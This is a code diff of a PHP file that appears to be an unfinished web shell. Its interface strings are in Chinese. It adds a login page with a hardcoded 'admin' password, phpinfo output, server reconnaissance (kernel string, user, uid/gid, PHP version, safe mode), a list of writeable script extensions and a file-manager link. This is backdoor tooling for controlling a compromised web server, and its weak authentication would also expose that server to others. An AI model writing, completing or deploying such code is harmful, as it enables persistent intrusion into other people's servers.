@@ -1,15 +1,19 @@
 <?php
 session_start();
-error_reporting(7);
 define('pass', 'admin');
 $op = @$_GET['op'];
 $op = $op ? $op : 'home';
+$dis_funcs = get_cfg_var('disable_functions');
+define('IS_PHPINFO',(!preg_match('/phpinfo/',$dis_funcs) ? 1 : 0));
+!@$writeable && $writeable = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
+$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 $ip = ip();
 Bl_ip();
 if (empty(@$_SESSION[$ip])) {
     $_SESSION[$ip][] = array(0,time());
 }
-if (!isset($_COOKIE['passwd'])) {
+if (empty($_COOKIE['passwd'])) {
+    if (empty($_POST['auth'])) login(4);
     if (empty($_POST['passwd'])) login(0);
     if (@$_POST['passwd'] == pass) {
         setcookie('passwd', pass, time() + 3600);
@@ -27,6 +31,18 @@ if (!isset($_COOKIE['passwd'])) {
         $_SESSION['timeout'] = time() + 900;
         setcookie('passwd', pass, time() + 3600);
     }
+}
+if ($op == 'phpinfo()') {
+    if (IS_PHPINFO) {
+        phpinfo();
+        exit;
+    }else{
+        $errmesage = '改操作没权限';
+    }
+}
+if ($op == 'logout'){
+    setcookie('passwd', '', time() - 3600);
+    login(4);
 }
 function Bl_ip(){
     global $ip;
@@ -49,14 +65,13 @@ function login($err){
     global $ip;
     $file = basename(__FILE__);
     global $_SESSION;
-    $errs = array('密码不能为空','密码错误 请重新输入','验证过期 请重新验证','访问频繁 请稍后再试');
+    $errs = array('密码不能为空','密码错误 请重新输入','验证过期 请重新验证','访问频繁 请稍后再试','');
     $error = $errs[$err];
     if ($err == 1 or $err == 0) {
         $num = count($_SESSION[$ip]) - 1;
         list($count,$time) = $_SESSION[$ip][$num];
         $count ++;
         $_SESSION[$ip][] = array($count, time());
-//        var_dump(get_time($_SESSION[$ip][$num][1],$_SESSION[$ip][0][1]));
         if (get_time($_SESSION[$ip][$num][1],$_SESSION[$ip][0][1]) >= 5) {
             if($_SESSION[$ip][$num][0] - $_SESSION[$ip][0][0] > 4){
                 unset($_SESSION[$ip]);
@@ -84,7 +99,7 @@ EOT;
     }
 echo <<<EOT
 <form action="{$file}" method="post">
-<span style="color: white;">请输入密码：</span>  <input type="text"  name="passwd" style="text-align:center; " > <input type="submit" name="提交">
+<span style="color: white;">请输入密码：</span>  <input name="auth" type="hidden" value="1"><input type="text"  name="passwd" style="text-align:center; "  > <input type="submit" name="提交">
 </form>
 </body>
 </html>
@@ -105,5 +120,59 @@ function ip() {
     return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
 }
 
-echo @date('h-i-s', time());
+function m($msg){
+    echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
+    echo $msg;
+    echo '</div>';
+}
+?>
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html" charset="gb2312">
+    <title><?php echo $op.'-'.$_SERVER['HTTP_HOST'];?></title>
+<body style="margin:0;table-layout:fixed; word-break:break-all">
+<?php
+if (!function_exists('posix_getegid')) {
+    $user = @get_current_user();
+    $uid = @getmyuid();
+    $gid = @getmygid();
+    $group = "?";
+}else{
+    $uid = @posix_getpwuid(@posix_getuid());
+    $gid = @posix_getgrgid(@posix_getegid());
+    $user = $uid['name'];
+    $uid = $uid['uid'];
+    $gid = $gid['gid'];
+    $group = $gid['name'];
+}
+?>
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+    <tr> <span style="float:right;"><?php echo @php_uname()?>/user: <?php echo $uid.'('.$user.')/group'.$gid.'('.$group.')';?></span></tr>
+    <tr>
+        <td style="color: red;">
+            <span style="float: right;">PHP<?php echo PHP_VERSION;?>/safe mode:<?php echo getcfg('safe_mode');?></span>
+            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
+            <a href="<?php echo basename($self).'?op=file'?>">filemange</a>
+            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
+            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
+            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
+            <a href="<?php echo basename($self).'?op=logout'?>">logout</a>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
+
+<?php
+function getcfg($varname){
+    $result = get_cfg_var($varname);
+    if ($result == 0) {
+        return 'no';
+    } elseif ($result == 1) {
+        return 'yes';
+    }else{
+        return $result;
+    }
+
+}
 ?>
